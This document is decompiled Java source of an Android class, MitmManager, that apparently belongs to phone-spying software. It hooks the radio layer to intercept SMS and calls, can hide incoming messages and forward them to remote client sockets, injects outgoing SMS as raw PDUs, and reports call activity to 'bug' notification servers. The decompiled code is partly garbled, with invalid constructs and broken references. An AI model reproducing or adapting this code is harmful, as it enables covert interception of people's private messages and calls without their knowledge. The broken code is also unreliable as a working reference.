package com.vvt.callmanager.mitm;

import android.content.Context;
import android.os.ConditionVariable;
import android.os.Parcel;
import android.telephony.SmsManager;
import com.android.internal.telephony.GsmAlphabet.TextEncodingDetails;
import com.android.internal.telephony.SmsHeader;
import com.android.internal.telephony.SmsHeader.ConcatRef;
import com.android.internal.telephony.gsm.SmsMessage;
import com.android.internal.telephony.gsm.SmsMessage.SubmitPdu;
import com.android.internal.telephony.uicc.IccUtils;
import com.vvt.base.communication.SmsInterceptInfo;
import com.vvt.base.communication.SmsInterceptInfo.InterceptionMethod;
import com.vvt.callmanager.Mitm;
import com.vvt.callmanager.a.m;
import com.vvt.callmanager.filter.FilterSms;
import com.vvt.callmanager.ref.ActiveCallInfo;
import com.vvt.callmanager.ref.BugEngineCallState;
import com.vvt.callmanager.ref.BugNotification;
import com.vvt.callmanager.ref.MonitorDisconnectData;
import com.vvt.callmanager.ref.command.RemoteForwardInterceptingSms;
import com.vvt.callmanager.ref.command.RemoteNotifyOnCallActive;
import com.vvt.callmanager.ref.command.RemoteNotifyOnCallStateChanged;
import com.vvt.callmanager.ref.command.RemoteNotifyOnMonitorDisconnect;
import com.vvt.callmanager.ref.command.RemoteResetMitm;
import com.vvt.callmanager.ref.e;
import com.vvt.network.NetworkServiceInfo;
import com.vvt.network.NetworkServiceInfo.State;
import com.vvt.network.NetworkServiceInfo.Type;
import com.vvt.sms.SmsInfo;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

/**
 *
 */
public class MitmManager implements d, o, e, com.vvt.network.d {
    private static final boolean a = com.vvt.callmanager.ref.g.b;
    private static final boolean b = com.vvt.callmanager.ref.g.d;
    private static final boolean c = com.vvt.callmanager.ref.g.e;
    private static MitmManager sInstance;
    private static int p;
    private a e;
    private a f;
    private Context context;
    private Mitm h;
    private com.vvt.callmanager.filter.o i;
    private com.vvt.callmanager.filter.o j;
    private Timer k;
    private Timer l;
    private TimerTask m;
    private TimerTask n;
    private HashMap o;

    static {
        Random localRandom = new java.util.Random();
        p = localRandom.nextInt(256);
    }

    private MitmManager(Context context) {
        this.o = new java.util.HashMap();
        this.context = context;
        this.h = Mitm.getInstance();
    }

    public static MitmManager getInstance(Context paramContext) {
        if (sInstance == null) {
            sInstance = new MitmManager();
        }
        return sInstance;
    }

    private void a(com.vvt.callmanager.filter.n paramn) {
        long l1 = 10000L;
        boolean bool = paramn instanceof n;
        Object localObject;
        TimerTask localTimerTask;
        if (bool)
        {
            localObject = this.n;
            if (localObject != null)
            {
                localObject = this.n;
                ((TimerTask)localObject).cancel();
            }
            localObject = this.l;
            if (localObject != null)
            {
                localObject = this.l;
                ((Timer)localObject).cancel();
            }
            localObject = g();
            this.n = ((TimerTask)localObject);
            localObject = new java/util/Timer;
            ((Timer)localObject).<init>();
            this.l = ((Timer)localObject);
            localObject = this.l;
            localTimerTask = this.n;
            ((Timer)localObject).schedule(localTimerTask, l1);
            localObject = MitmManager.FilterType.FILTER_SMS;
            localObject = b((MitmManager.FilterType)localObject);
            this.j = ((com.vvt.callmanager.filter.o)localObject);
            localObject = this.j;
            ((com.vvt.callmanager.filter.n)paramn).a((com.vvt.callmanager.filter.o)localObject);
        }
        for (;;)
        {
            return;
            bool = paramn instanceof c;
            if (bool)
            {
                localObject = this.m;
                if (localObject != null)
                {
                    localObject = this.m;
                    ((TimerTask)localObject).cancel();
                }
                localObject = this.k;
                if (localObject != null)
                {
                    localObject = this.k;
                    ((Timer)localObject).cancel();
                }
                localObject = g();
                this.m = ((TimerTask)localObject);
                localObject = new java/util/Timer;
                ((Timer)localObject).<init>();
                this.k = ((Timer)localObject);
                localObject = this.k;
                localTimerTask = this.m;
                ((Timer)localObject).schedule(localTimerTask, l1);
                localObject = MitmManager.FilterType.FILTER_CALL;
                localObject = b((MitmManager.FilterType)localObject);
                this.i = ((com.vvt.callmanager.filter.o)localObject);
                localObject = this.i;
                ((com.vvt.callmanager.filter.n)paramn).a((com.vvt.callmanager.filter.o)localObject);
            }
        }
    }

    private void a(MitmManager.FilterType paramFilterType)
    {
        Object localObject = MitmManager.FilterType.FILTER_SMS;
        boolean bool;
        if (paramFilterType == localObject)
        {
            localObject = this.n;
            if (localObject != null)
            {
                localObject = this.n;
                ((TimerTask)localObject).cancel();
                this.n = null;
            }
            localObject = this.l;
            if (localObject != null)
            {
                localObject = this.l;
                ((Timer)localObject).cancel();
                this.l = null;
            }
            bool = a;
            if (!bool) {}
        }
        for (;;)
        {
            return;
            localObject = MitmManager.FilterType.FILTER_CALL;
            if (paramFilterType == localObject)
            {
                localObject = this.m;
                if (localObject != null)
                {
                    localObject = this.m;
                    ((TimerTask)localObject).cancel();
                    this.m = null;
                }
                localObject = this.k;
                if (localObject != null)
                {
                    localObject = this.k;
                    ((Timer)localObject).cancel();
                    this.k = null;
                }
                bool = a;
                if (!bool) {}
            }
        }
    }

    private void a(NetworkServiceInfo.Type paramType)
    {
        String str = com.vvt.callmanager.ref.b.c;
        boolean bool = com.vvt.b.c.a(paramType, str);
        if (!bool)
        {
            bool = b;
            if (!bool) {}
        }
    }

    private void a(String paramString)
    {
        Object localObject1 = b(paramString);
        boolean bool1 = a;
        if ((!bool1) || (localObject1 != null))
        {
            Iterator localIterator = ((ArrayList)localObject1).iterator();
            for (;;)
            {
                boolean bool2 = localIterator.hasNext();
                if (!bool2) {
                    return;
                }
                localObject1 = (SmsInfo)localIterator.next();
                Object localObject2 = new com/vvt/sms/SmsInfo;
                ((SmsInfo)localObject2).<init>();
                Object localObject4 = ((SmsInfo)localObject1).getPhoneNumber();
                ((SmsInfo)localObject2).setPhoneNumber((String)localObject4);
                localObject4 = ((SmsInfo)localObject1).getMessageBody();
                ((SmsInfo)localObject2).setMessageBody((String)localObject4);
                localObject4 = new com.vvt.callmanager.ref.command.RemoteForwardInterceptingSms((SmsInfo)localObject2, paramString);

                try {
                    localObject2 = ((RemoteForwardInterceptingSms)localObject4).execute();
                    localObject2 = (Boolean)localObject2;
                    bool1 = ((Boolean)localObject2).booleanValue();
                }
                catch (IOException localIOException)
                {
                    for (;;)
                    {
                        bool1 = c;
                        if (bool1) {}
                        bool1 = false;
                        Object localObject3 = null;
                    }
                }
                if (bool1)
                {
                    bool1 = a;
                    if (bool1) {}
                    a(paramString, (SmsInfo)localObject1);
                }
            }
        }
    }

    private void a(String paramString, SmsInfo paramSmsInfo)
    {
        for (;;)
        {
            int i2;
            synchronized (this.o)
            {
                Object localObject1 = this.o;
                boolean bool1 = ((HashMap)localObject1).containsKey(paramString);
                boolean bool2;
                if (bool1)
                {
                    localObject1 = this.o;
                    localObject1 = ((HashMap)localObject1).get(paramString);
                    localObject1 = (ArrayList)localObject1;
                    i2 = -1;
                    int i3 = 0;
                    int i5 = ((ArrayList)localObject1).size();
                    if (i3 >= i5) {
                        break label238;
                    }
                    Object localObject3 = ((ArrayList)localObject1).get(i3);
                    localObject3 = (SmsInfo)localObject3;
                    Object localObject4 = paramSmsInfo.getType();
                    Object localObject5 = ((SmsInfo)localObject3).getType();
                    if (localObject4 != localObject5) {
                        continue;
                    }
                    localObject4 = paramSmsInfo.getPhoneNumber();
                    localObject5 = ((SmsInfo)localObject3).getPhoneNumber();
                    boolean bool4 = ((String)localObject4).equalsIgnoreCase((String)localObject5);
                    if (!bool4) {
                        continue;
                    }
                    localObject4 = paramSmsInfo.getMessageBody();
                    localObject3 = ((SmsInfo)localObject3).getMessageBody();
                    int i6 = ((String)localObject4).equalsIgnoreCase((String)localObject3);
                    if (i6 == 0) {
                        continue;
                    }
                    i6 = i3;
                    bool2 = a;
                    if ((!bool2) || (i6 >= 0))
                    {
                        ((ArrayList)localObject1).remove(i6);
                        int i1 = ((ArrayList)localObject1).size();
                        if (i1 <= 0)
                        {
                            localObject1 = this.o;
                            ((HashMap)localObject1).remove(paramString);
                        }
                    }
                }
                return;
                bool3 = a;
                if (bool3) {}
                int i4;
                bool2 += true;
            }
            label238:
            boolean bool3 = i2;
        }
    }

    private boolean a(String paramString, ArrayList paramArrayList)
    {
        int i1 = 1;
        boolean bool1 = a;
        if (bool1) {}
        bool1 = false;
        int i2 = c();
        int i3 = i2 & 0xFF;
        int i4 = paramArrayList.size();
        GsmAlphabet.TextEncodingDetails[] arrayOfTextEncodingDetails = new GsmAlphabet.TextEncodingDetails[i4];
        int i5 = 0;
        String str = null;
        int i6 = 0;
        while (i5 < i4)
        {
            localObject = SmsMessage.calculateLength((CharSequence)paramArrayList.get(i5), false);
            int i7 = ((GsmAlphabet.TextEncodingDetails)localObject).codeUnitSize;
            if ((i6 != i7) && ((i6 == 0) || (i6 == i1))) {
                i6 = ((GsmAlphabet.TextEncodingDetails)localObject).codeUnitSize;
            }
            arrayOfTextEncodingDetails[i5] = localObject;
            i2 = i5 + 1;
            i5 = i2;
        }
        int i8 = 0;
        i2 = 0;
        Object localObject = null;
        boolean bool2;
        while (i8 < i4)
        {
            localObject = new com/android/internal/telephony/SmsHeader$ConcatRef;
            ((SmsHeader.ConcatRef)localObject).<init>();
            ((SmsHeader.ConcatRef)localObject).refNumber = i3;
            i5 = i8 + 1;
            ((SmsHeader.ConcatRef)localObject).seqNumber = i5;
            ((SmsHeader.ConcatRef)localObject).msgCount = i4;
            ((SmsHeader.ConcatRef)localObject).isEightBits = i1;
            SmsHeader localSmsHeader = new com/android/internal/telephony/SmsHeader;
            localSmsHeader.<init>();
            localSmsHeader.concatRef = ((SmsHeader.ConcatRef)localObject);
            if (i6 == i1)
            {
                i2 = arrayOfTextEncodingDetails[i8].languageTable;
                localSmsHeader.languageTable = i2;
                localObject = arrayOfTextEncodingDetails[i8];
                i2 = ((GsmAlphabet.TextEncodingDetails)localObject).languageShiftTable;
                localSmsHeader.languageShiftTable = i2;
            }
            str = (String)paramArrayList.get(i8);
            byte[] arrayOfByte = SmsHeader.toByteArray(localSmsHeader);
            int i9 = localSmsHeader.languageTable;
            int i10 = localSmsHeader.languageShiftTable;
            localObject = paramString;
            localObject = SmsMessage.getSubmitPdu(null, paramString, str, false, arrayOfByte, i6, i9, i10);
            boolean bool3 = a((SmsMessage.SubmitPdu)localObject);
            bool2 = a;
            if (bool2) {}
            i8 += 1;
            bool2 = bool3;
        }
        bool1 = a;
        if (bool1) {}
        return bool2;
    }

    private com.vvt.callmanager.filter.o b(MitmManager.FilterType paramFilterType)
    {
        i locali = new com/vvt/callmanager/mitm/i;
        locali.<init>(this, paramFilterType);
        return locali;
    }

    private ArrayList b(String paramString)
    {
        synchronized (this.o)
        {
            Object localObject1 = this.o;
            boolean bool1 = ((HashMap)localObject1).containsKey(paramString);
            boolean bool2;
            if (bool1)
            {
                localObject1 = this.o;
                localObject1 = ((HashMap)localObject1).get(paramString);
                localObject1 = (ArrayList)localObject1;
                bool2 = a;
                if (!bool2) {}
            }
            do
            {
                return (ArrayList)localObject1;
                bool1 = false;
                localObject1 = null;
                bool2 = a;
            } while (!bool2);
        }
    }

    private void b(NetworkServiceInfo paramNetworkServiceInfo)
    {
        long l1 = 5000L;
        boolean bool1 = a;
        if (bool1) {}
        bool1 = a;
        if (bool1) {}
        bool1 = a;
        if (bool1) {}
        this.h.c();
        Object localObject1 = paramNetworkServiceInfo.a();
        Object localObject2 = NetworkServiceInfo.State.ACTIVE;
        Object localObject3;
        if (localObject1 == localObject2)
        {
            localObject1 = paramNetworkServiceInfo.b();
            localObject2 = NetworkServiceInfo.Type.UNKNOWN;
            if (localObject1 == localObject2)
            {
                localObject1 = e();
                boolean bool2 = b;
                if (!bool2) {
                    break label535;
                }
                localObject3 = localObject1;
                localObject1 = new com/vvt/callmanager/a/m;
                localObject2 = "FilterSms";
                boolean bool3 = com.vvt.callmanager.ref.g.g;
                boolean bool4 = com.vvt.callmanager.ref.g.i;
                ((m)localObject1).<init>((String)localObject2, bool3, bool4);
                bool2 = com.vvt.callmanager.ref.g.i;
                if (bool2)
                {
                    localObject2 = this.e;
                    if (localObject2 == null)
                    {
                        localObject2 = new com/vvt/callmanager/mitm/a;
                        localObject4 = com.vvt.callmanager.ref.b.h;
                        ((a)localObject2).<init>((String)localObject4, l1);
                        this.e = ((a)localObject2);
                    }
                    this.e.a();
                    localObject2 = this.e;
                    ((m)localObject1).a((a)localObject2);
                }
                localObject2 = this.context;
                Object localObject4 = this.h;
                localObject2 = com.vvt.callmanager.filter.f.a((Context)localObject2, (Mitm)localObject4, (m)localObject1);
                if (localObject2 != null)
                {
                    a((com.vvt.callmanager.filter.n)localObject2);
                    bool1 = localObject2 instanceof n;
                    if (bool1)
                    {
                        localObject1 = localObject2;
                        localObject1 = (n)localObject2;
                        ((n)localObject1).a(this);
                    }
                    localObject1 = this.h;
                    ((Mitm)localObject1).a((com.vvt.callmanager.filter.n)localObject2);
                    ((com.vvt.callmanager.filter.n)localObject2).d();
                    bool1 = a;
                    if (!bool1) {}
                }
                localObject1 = new com/vvt/callmanager/a/m;
                localObject2 = "FilterCall";
                bool3 = com.vvt.callmanager.ref.g.f;
                bool4 = com.vvt.callmanager.ref.g.h;
                ((m)localObject1).<init>((String)localObject2, bool3, bool4);
                bool2 = com.vvt.callmanager.ref.g.h;
                if (bool2)
                {
                    localObject2 = this.f;
                    if (localObject2 == null)
                    {
                        localObject2 = new com/vvt/callmanager/mitm/a;
                        localObject4 = com.vvt.callmanager.ref.b.g;
                        ((a)localObject2).<init>((String)localObject4, l1);
                        this.f = ((a)localObject2);
                    }
                    this.f.a();
                    localObject2 = this.f;
                    ((m)localObject1).a((a)localObject2);
                }
                localObject2 = this.context;
                localObject4 = this.h;
                localObject2 = com.vvt.callmanager.filter.f.a((NetworkServiceInfo.Type)localObject3, (Context)localObject2, (Mitm)localObject4, (m)localObject1);
                if (localObject2 != null)
                {
                    a((com.vvt.callmanager.filter.n)localObject2);
                    bool1 = localObject2 instanceof c;
                    if (bool1)
                    {
                        localObject1 = localObject2;
                        localObject1 = (c)localObject2;
                        ((c)localObject1).a(this);
                    }
                    bool1 = localObject2 instanceof com.vvt.callmanager.filter.a;
                    if (bool1)
                    {
                        localObject1 = localObject2;
                        localObject1 = (com.vvt.callmanager.filter.a)localObject2;
                        ((com.vvt.callmanager.filter.a)localObject1).a(this);
                    }
                    localObject1 = this.h;
                    ((Mitm)localObject1).a((com.vvt.callmanager.filter.n)localObject2);
                    ((com.vvt.callmanager.filter.n)localObject2).d();
                    bool1 = a;
                    if (!bool1) {}
                }
            }
        }
        for (;;)
        {
            bool1 = a;
            if (bool1) {}
            return;
            a((NetworkServiceInfo.Type)localObject1);
            label535:
            localObject3 = localObject1;
            break;
            localObject1 = this.e;
            if (localObject1 != null)
            {
                localObject1 = this.e;
                ((a)localObject1).b();
            }
            localObject1 = this.f;
            if (localObject1 != null)
            {
                localObject1 = this.f;
                ((a)localObject1).b();
            }
        }
    }

    private void b(String paramString, SmsInfo paramSmsInfo)
    {
        synchronized (this.o)
        {
            Object localObject1 = this.o;
            boolean bool1 = ((HashMap)localObject1).containsKey(paramString);
            if (bool1)
            {
                localObject1 = this.o;
                localObject1 = ((HashMap)localObject1).get(paramString);
                localObject1 = (ArrayList)localObject1;
                boolean bool2 = a;
                if (bool2) {}
                ((ArrayList)localObject1).add(paramSmsInfo);
                bool2 = a;
                if (bool2) {}
                HashMap localHashMap2 = this.o;
                localHashMap2.put(paramString, localObject1);
                return;
            }
            localObject1 = new java/util/ArrayList;
            ((ArrayList)localObject1).<init>();
        }
    }

    private boolean b(String paramString1, String paramString2)
    {
        boolean bool1 = false;
        bool2 = a;
        if (bool2) {}
        bool2 = false;
        SmsMessage.SubmitPdu localSubmitPdu = null;
        try
        {
            localSubmitPdu = SmsMessage.getSubmitPdu(null, paramString1, paramString2, false);
            bool1 = a(localSubmitPdu);
        }
        catch (Exception localException)
        {
            for (;;)
            {
                bool2 = c;
                if (!bool2) {}
            }
        }
        bool2 = a;
        if (bool2) {}
        return bool1;
    }

    protected static int c()
    {
        p += 1;
        return p;
    }

    private NetworkServiceInfo.Type e()
    {
        NetworkServiceInfo.Type localType = NetworkServiceInfo.Type.UNKNOWN;
        Object localObject = com.vvt.b.c.a(com.vvt.callmanager.ref.b.c);
        boolean bool = localObject instanceof NetworkServiceInfo.Type;
        if (bool) {}
        for (localObject = (NetworkServiceInfo.Type)localObject;; localObject = localType) {
            return (NetworkServiceInfo.Type)localObject;
        }
    }

    private void f()
    {
        boolean bool = c;
        if (bool) {}
        h();
        RemoteResetMitm localRemoteResetMitm = new com/vvt/callmanager/ref/command/RemoteResetMitm;
        localRemoteResetMitm.<init>();
        try
        {
            localRemoteResetMitm.execute();
            return;
        }
        catch (IOException localIOException)
        {
            for (;;)
            {
                bool = c;
                if (!bool) {}
            }
        }
    }

    private TimerTask g()
    {
        h localh = new com/vvt/callmanager/mitm/h;
        localh.<init>(this);
        return localh;
    }

    private void h()
    {
        Object localObject = this.n;
        if (localObject != null)
        {
            localObject = this.n;
            ((TimerTask)localObject).cancel();
            this.n = null;
        }
        localObject = this.l;
        if (localObject != null)
        {
            localObject = this.l;
            ((Timer)localObject).cancel();
            this.l = null;
        }
        localObject = this.m;
        if (localObject != null)
        {
            localObject = this.m;
            ((TimerTask)localObject).cancel();
            this.m = null;
        }
        localObject = this.k;
        if (localObject != null)
        {
            localObject = this.k;
            ((Timer)localObject).cancel();
            this.k = null;
        }
    }

    public void a()
    {
        boolean bool1 = a;
        if (bool1) {}
        Object localObject1 = new android/os/ConditionVariable;
        boolean bool2 = false;
        ((ConditionVariable)localObject1).<init>(false);
        Object localObject2 = new com/vvt/callmanager/mitm/j;
        Context localContext = this.context;
        ((j)localObject2).<init>(localContext, (ConditionVariable)localObject1);
        boolean bool3 = a;
        if (bool3) {}
        ((j)localObject2).a();
        bool3 = a;
        if (bool3) {}
        ((j)localObject2).start();
        bool2 = a;
        if (bool2) {}
        localObject2 = this.h;
        ((Mitm)localObject2).b();
        bool2 = a;
        if (bool2) {}
        long l1 = 20000L;
        ((ConditionVariable)localObject1).block(l1);
        bool1 = a;
        if (bool1) {}
        bool1 = a;
        if (bool1) {}
        localObject1 = "MitmManager";
        com.fx.daemon.b.a((String)localObject1);
        bool1 = a;
        if (bool1) {}
        localObject1 = new com/vvt/network/a;
        localObject2 = this.context;
        ((com.vvt.network.a)localObject1).<init>((Context)localObject2, this);
        localObject2 = new com/vvt/callmanager/mitm/f;
        ((f)localObject2).<init>(this);
        ((com.vvt.network.a)localObject1).setUncaughtExceptionHandler((Thread.UncaughtExceptionHandler)localObject2);
        localObject2 = ((com.vvt.network.a)localObject1).a();
        b((NetworkServiceInfo)localObject2);
        bool2 = a;
        if (bool2) {}
        ((com.vvt.network.a)localObject1).start();
        bool1 = a;
        if (bool1) {}
        bool1 = a;
        if (bool1) {}
    }

    public void a(SmsInterceptInfo paramSmsInterceptInfo, SmsInfo paramSmsInfo)
    {
        str = paramSmsInterceptInfo.getClientSocketName();
        bool = a;
        if (bool) {}
        try
        {
            Object localObject1 = new com/vvt/sms/SmsInfo;
            ((SmsInfo)localObject1).<init>();
            Object localObject3 = paramSmsInfo.getPhoneNumber();
            ((SmsInfo)localObject1).setPhoneNumber((String)localObject3);
            localObject3 = paramSmsInfo.getMessageBody();
            ((SmsInfo)localObject1).setMessageBody((String)localObject3);
            localObject3 = new com/vvt/callmanager/ref/command/RemoteForwardInterceptingSms;
            ((RemoteForwardInterceptingSms)localObject3).<init>((SmsInfo)localObject1, str);
            localObject1 = ((RemoteForwardInterceptingSms)localObject3).execute();
            localObject1 = (Boolean)localObject1;
            bool = ((Boolean)localObject1).booleanValue();
        }
        catch (Exception localException)
        {
            for (;;)
            {
                bool = c;
                if (bool) {}
                bool = false;
                Object localObject2 = null;
                continue;
                bool = c;
                if (bool) {}
                b(str, paramSmsInfo);
            }
        }
        if (bool)
        {
            bool = a;
            if (bool) {}
            a(str);
            return;
        }
    }

    public void a(ActiveCallInfo paramActiveCallInfo)
    {
        boolean bool1 = a;
        if (bool1) {}
        Object localObject1 = com.vvt.callmanager.ref.f.a().c();
        for (;;)
        {
            try
            {
                Iterator localIterator = ((HashSet)localObject1).iterator();
                bool1 = localIterator.hasNext();
                if (bool1)
                {
                    localObject1 = localIterator.next();
                    localObject1 = (BugNotification)localObject1;
                    boolean bool2 = ((BugNotification)localObject1).isListenOnCallActive();
                    boolean bool3 = a;
                    if (bool3) {}
                    bool3 = a;
                    if ((!bool3) || (bool2))
                    {
                        Object localObject2 = ((BugNotification)localObject1).getServerName();
                        if (localObject2 != null)
                        {
                            localObject2 = new com/vvt/callmanager/ref/command/RemoteNotifyOnCallActive;
                            localObject1 = ((BugNotification)localObject1).getServerName();
                            ((RemoteNotifyOnCallActive)localObject2).<init>(paramActiveCallInfo, (String)localObject1);
                            ((RemoteNotifyOnCallActive)localObject2).execute();
                        }
                    }
                }
                else
                {
                    return;
                }
            }
            catch (Exception localException)
            {
                bool1 = c;
                if (!bool1) {}
            }
            bool1 = b;
            if (!bool1) {}
        }
    }

    public void a(BugEngineCallState paramBugEngineCallState)
    {
        boolean bool1 = a;
        if (bool1) {}
        Object localObject1 = com.vvt.callmanager.ref.f.a().c();
        Iterator localIterator = ((HashSet)localObject1).iterator();
        for (;;)
        {
            bool1 = localIterator.hasNext();
            if (!bool1) {
                break;
            }
            localObject1 = (BugNotification)localIterator.next();
            boolean bool2 = ((BugNotification)localObject1).isListenOnCallState();
            if (bool2)
            {
                Object localObject2 = ((BugNotification)localObject1).getServerName();
                if (localObject2 != null)
                {
                    localObject2 = new com/vvt/callmanager/ref/command/RemoteNotifyOnCallStateChanged;
                    localObject1 = ((BugNotification)localObject1).getServerName();
                    ((RemoteNotifyOnCallStateChanged)localObject2).<init>(paramBugEngineCallState, (String)localObject1);
                    localObject1 = new com/vvt/callmanager/mitm/ context;
                    ((g)localObject1).<init>(this, (RemoteNotifyOnCallStateChanged)localObject2);
                    ((g)localObject1).start();
                    continue;
                }
            }
            bool1 = b;
            if (!bool1) {}
        }
        bool1 = a;
        if (bool1) {}
    }

    public void a(MonitorDisconnectData paramMonitorDisconnectData)
    {
        boolean bool1 = a;
        if (bool1) {}
        Object localObject1 = com.vvt.callmanager.ref.f.a().c();
        for (;;)
        {
            try
            {
                Iterator localIterator = ((HashSet)localObject1).iterator();
                bool1 = localIterator.hasNext();
                if (bool1)
                {
                    localObject1 = localIterator.next();
                    localObject1 = (BugNotification)localObject1;
                    boolean bool2 = ((BugNotification)localObject1).isListenOnMonitorDisconnect();
                    if (bool2)
                    {
                        Object localObject2 = ((BugNotification)localObject1).getServerName();
                        if (localObject2 != null)
                        {
                            localObject2 = new com/vvt/callmanager/ref/command/RemoteNotifyOnMonitorDisconnect;
                            localObject1 = ((BugNotification)localObject1).getServerName();
                            ((RemoteNotifyOnMonitorDisconnect)localObject2).<init>(paramMonitorDisconnectData, (String)localObject1);
                            ((RemoteNotifyOnMonitorDisconnect)localObject2).execute();
                        }
                    }
                }
                else
                {
                    return;
                }
            }
            catch (Exception localException)
            {
                bool1 = c;
                if (!bool1) {}
            }
            bool1 = b;
            if (!bool1) {}
        }
    }

    public void a(NetworkServiceInfo paramNetworkServiceInfo)
    {
        boolean bool = a;
        if (bool) {}
        b(paramNetworkServiceInfo);
        bool = a;
        if (bool) {}
    }

    public boolean a(SmsMessage.SubmitPdu paramSubmitPdu)
    {
        boolean bool1 = false;
        m localm = null;
        boolean bool2 = a;
        if (bool2) {}
        Object localObject1 = paramSubmitPdu.encodedScAddress;
        Object localObject2 = paramSubmitPdu.encodedMessage;
        localObject1 = IccUtils.bytesToHexString((byte[])localObject1);
        localObject2 = IccUtils.bytesToHexString((byte[])localObject2);
        Parcel localParcel = Parcel.obtain();
        localParcel.writeInt(0);
        localParcel.writeInt(25);
        localParcel.writeInt(168430090);
        int i1 = 2;
        localParcel.writeInt(i1);
        localParcel.writeString((String)localObject1);
        localParcel.writeString((String)localObject2);
        com.fx.socket.d.a(localParcel);
        bool2 = a;
        if (bool2) {}
        localObject1 = this.h.d();
        int i2 = ((List)localObject1).size();
        if (i2 == 0)
        {
            bool2 = false;
            localObject1 = null;
        }
        for (;;)
        {
            bool1 = a;
            if (bool1) {}
            return bool2;
            localObject2 = ((List)localObject1).iterator();
            boolean bool3;
            do
            {
                bool2 = ((Iterator)localObject2).hasNext();
                if (!bool2) {
                    break;
                }
                localObject1 = (com.vvt.callmanager.filter.n)((Iterator)localObject2).next();
                bool3 = localObject1 instanceof n;
            } while (!bool3);
            localObject1 = (FilterSms)localObject1;
            bool1 = a;
            if (bool1) {}
            localm = ((FilterSms)localObject1).a();
            localm.a(localParcel);
            bool1 = a;
            if (bool1) {}
            ((FilterSms)localObject1).d(localParcel);
            bool2 = true;
            continue;
            bool2 = false;
            localObject1 = null;
        }
    }

    public boolean a(String paramString1, String paramString2)
    {
        ArrayList localArrayList = SmsManager.getDefault().divideMessage(paramString2);
        boolean bool1 = a;
        if (bool1) {}
        int i1 = localArrayList.size();
        int i2 = 1;
        if (i1 > i2) {}
        for (boolean bool2 = a(paramString1, localArrayList);; bool2 = b(paramString1, paramString2)) {
            return bool2;
        }
    }

    public void b(SmsInterceptInfo paramSmsInterceptInfo, SmsInfo paramSmsInfo)
    {
        String str = paramSmsInterceptInfo.getClientSocketName();
        boolean bool = a;
        if (bool) {}
        b(str, paramSmsInfo);
    }

    public boolean b()
    {
        boolean bool1 = a;
        if (bool1) {}
        bool1 = a;
        if (bool1) {}
        synchronized (this.o)
        {
            Object localObject1 = com.vvt.callmanager.ref.f.a();
            localObject1 = ((com.vvt.callmanager.ref.f)localObject1).b();
            Iterator localIterator = ((HashSet)localObject1).iterator();
            SmsInterceptInfo.InterceptionMethod localInterceptionMethod1;
            SmsInterceptInfo.InterceptionMethod localInterceptionMethod2;
            do
            {
                bool1 = localIterator.hasNext();
                if (!bool1) {
                    break label121;
                }
                localObject1 = localIterator.next();
                localObject1 = (SmsInterceptInfo)localObject1;
                localInterceptionMethod1 = ((SmsInterceptInfo)localObject1).getInterceptionMethod();
                boolean bool2 = a;
                if (bool2) {}
                localInterceptionMethod2 = SmsInterceptInfo.InterceptionMethod.FORWARD_ONLY;
                if (localInterceptionMethod1 == localInterceptionMethod2) {
                    break;
                }
                localInterceptionMethod2 = SmsInterceptInfo.InterceptionMethod.HIDE_AND_FORWARD;
            } while (localInterceptionMethod1 != localInterceptionMethod2);
            localObject1 = ((SmsInterceptInfo)localObject1).getClientSocketName();
            a((String)localObject1);
        }
        label121:
        bool1 = a;
        if (bool1) {}
        return true;
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/mitm/MitmManager.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */